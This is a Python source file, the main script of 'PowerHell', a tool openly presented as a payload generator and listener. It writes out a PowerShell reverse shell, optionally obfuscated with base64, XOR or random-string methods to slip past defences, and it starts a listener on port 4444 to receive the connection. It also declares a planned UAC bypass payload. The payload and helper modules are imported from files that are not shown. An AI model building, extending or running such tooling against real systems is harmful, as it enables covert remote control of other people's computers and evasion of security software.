import argparse
import sys
import os
from modules.listener import start_listener
from modules.obf import obfuscate_reverse_shell

banner = r"""
    ____                          __         ____
   / __ \____ _      _____  _____/ /_  ___  / / /
  / /_/ / __ \ | /| / / _ \/ ___/ __ \/ _ \/ / / 
 / ____/ /_/ / |/ |/ /  __/ /  / / / /  __/ / /  
/_/    \____/|__/|__/\___/_/  /_/ /_/\___/_/_/   

                Maker: vibebhavv
                Github: https://github.com/vibebhavv
"""
print(banner, '\n')

def main():
    parser = argparse.ArgumentParser(description='PowerHell: Awesome payload generator and listener')
    parser.add_argument('-l', '--listen', metavar='HOST', help='Host to listen on')
    parser.add_argument('-p', '--port', type=int, metavar='PORT', help='Port to listen on')
    parser.add_argument('-o', '--output', metavar='FILE', help='Output file for generated script')
    parser.add_argument('-obf', '--obfuscation', metavar='METHOD', default='none', help='Obfuscation method (none, base64, xor, random)')
    parser.add_argument('-payload', '--payload', metavar='TYPE', default='reverseshell', help='Payload type (reverseshell, uacbypass)')
    parser.add_argument('-s', '--start-listener', action='store_true', help='Start the interactive listener')

    args = parser.parse_args()

    if args.start_listener:
        host = args.listen if args.listen else '0.0.0.0'
        port = args.port if args.port else 4444
        try:
            start_listener(host, port)
        except Exception as e:
            print(f"[-] Error: {e}")
        return
    if args.output:
        if args.payload.lower() == 'reverseshell':
            if args.obfuscation == 'none':
                with open('reverse_shell.ps1', 'r') as f:
                    script = f.read()
                with open(args.output, 'w') as f:
                    f.write(script)
                print(f"[+] Script written to {args.output}")
            elif args.obfuscation in ('base64', 'xor', 'random', 'randomstring', 'random-string'):
                obfuscate_reverse_shell(args.obfuscation, input_file='modules/payloads/rvs.txt', output_file=args.output)
                print(f"[+] Obfuscated script written to {args.output} using {args.obfuscation}")
            else:
                print(f"[-] Unknown obfuscation method: {args.obfuscation}")
        elif args.payload.lower() == 'uacbypass':
            print("[!] UAC bypass payload generation is not implemented yet.")
        else:
            print(f"[-] Unknown payload type: {args.payload}")
        answer = input("Do you want to start the listener now? (y/N): ").strip().lower()
        if answer == 'y' or answer == 'yes':
            host = args.listen if args.listen else '0.0.0.0'
            port = args.port if args.port else 4444
            start_listener(host, port)
        return
    parser.print_help()

if __name__ == '__main__':
    main()
